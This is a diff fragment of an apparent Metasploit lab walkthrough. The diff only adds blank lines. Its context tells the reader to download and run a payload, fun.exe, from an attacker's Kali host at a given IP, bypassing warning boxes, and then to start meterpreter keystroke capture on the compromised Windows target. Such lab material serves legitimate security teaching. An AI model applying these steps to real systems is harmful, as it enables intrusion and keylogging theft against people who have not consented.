@@ -61,6 +61,7 @@ exploit
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
 http://192.50.252.7/fun.exe
 The file "fun.exe" downloads. 
+
 <img width="1920" height="1200" alt="image" src="https://github.com/user-attachments/assets/82af2852-1c17-4b9b-b5bd-2d99352c0fd1" />
 
 Bypass any warning boxes, double-click the file, and allow it to run.
@@ -89,6 +90,7 @@ Notice the "PID/Program name" value for this connection, which is redacted
 <img width="1920" height="1200" alt="g" src="https://github.com/user-attachments/assets/ed3e18c3-fc20-4e90-97e7-ed3fb88af229" />
 
 Post Exploitation
+
 The target is now owned. Following are meterpreter commands for key capturing in the target machine
 keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
 <img width="1920" height="1200" alt="image" src="https://github.com/user-attachments/assets/348a0615-b7e6-47cc-a21d-3fc7d23a741a" />
